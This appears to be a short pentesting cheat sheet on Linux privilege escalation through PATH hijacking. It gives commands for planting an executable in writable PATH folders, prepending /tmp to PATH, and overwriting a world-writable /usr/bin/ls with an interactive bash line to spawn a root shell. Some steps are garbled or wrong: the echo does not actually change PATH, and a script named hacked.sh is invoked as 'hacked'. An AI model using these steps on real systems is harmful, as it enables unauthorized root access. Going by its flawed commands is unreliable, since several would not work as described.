## Questions to ask yourself?
=================================================================================
PS: The PATH context must RUN as ``root`` to escalative priv to make it possible!!!
=================================================================================

# What folders are located under $PATH
$ echo $PATH
>> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

# Does your current user have write privileges for any of these folders?
>> if any of the folders in the PATH are writable,
>> you can easily generate exploit and stash it in the folder and call it like any other binary
$ cd /usr/bin
$ touch hacked.sh && chmod +x hacked.sh
>> The PATH context must RUN as ``root`` to escalative priv
$ hacked [ENTER]

# Can you modify $PATH?
$ echo PATH=/tmp:$PATH
>> now any binaries in the /tmp dir will run same with others, AS ROOT
$ touch hacked.sh && chmod +x hacked.sh
$ hacked [ENTER]

# Is there a script/application you can start that will be affected by this vulnerability?
>> if any binary has rwx permissions 777, it can be modified to help privesc
$ echo "/bin/bash -i" > /usr/bin/ls
$ ls [ENTER] --> anytime `ls` command runs it generates root shell
